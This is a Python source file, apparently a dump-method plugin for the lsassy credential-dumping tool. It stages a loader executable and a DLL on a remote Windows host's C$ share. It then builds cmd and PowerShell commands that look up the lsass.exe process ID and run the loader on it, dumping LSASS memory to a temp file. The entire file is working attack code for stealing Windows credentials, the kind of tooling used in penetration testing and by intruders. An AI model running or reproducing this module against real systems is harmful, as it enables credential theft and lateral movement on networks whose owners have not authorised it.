from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):
    custom_dump_path_support = False
    custom_dump_name_support = False

    dump_name = "tmp.dmp"
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"

    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.loader = Dependency("loader", "loader.exe")
        self.dll = Dependency("dll", "calc.dll")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.loader, self.dll])

    def clean(self):
        self.clean_dependencies([self.loader, self.dll])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {} %J""".format(
            self.loader.get_remote_path()
        )
        pwsh_command = """{}{} (Get-Process lsass).Id""".format(
            self.loader.remote_path, self.loader.file
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
